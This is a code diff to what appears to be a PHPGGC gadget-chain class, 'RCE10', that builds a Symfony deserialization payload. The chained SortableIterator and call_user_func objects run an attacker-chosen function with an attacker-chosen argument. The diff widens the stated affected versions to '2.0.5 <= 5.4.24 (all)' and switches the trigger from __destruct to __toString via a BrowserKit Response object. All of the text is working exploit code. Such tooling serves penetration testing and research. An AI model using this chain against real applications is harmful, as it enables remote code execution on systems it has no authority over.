@@ -4,8 +4,8 @@ namespace GadgetChain\Symfony;
 
 class RCE10 extends \PHPGGC\GadgetChain\RCE\FunctionCall
 {
-    public static $version = '2.6.0 <= 4.4.18';
-    public static $vector = '__destruct';
+    public static $version = '2.0.5 <= 5.4.24 (all)';
+    public static $vector = '__toString';
     public static $author = 'cfreal';
 
     public function generate(array $parameters)
@@ -15,7 +15,7 @@ class RCE10 extends \PHPGGC\GadgetChain\RCE\FunctionCall
             $parameters["parameter"]
         ]);
         $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
-        $c = new \Symfony\Component\Process\Pipes\WindowsPipes($b);
+        $c = new \Symfony\Component\BrowserKit\Response($b);
         return $c;
     }
 }
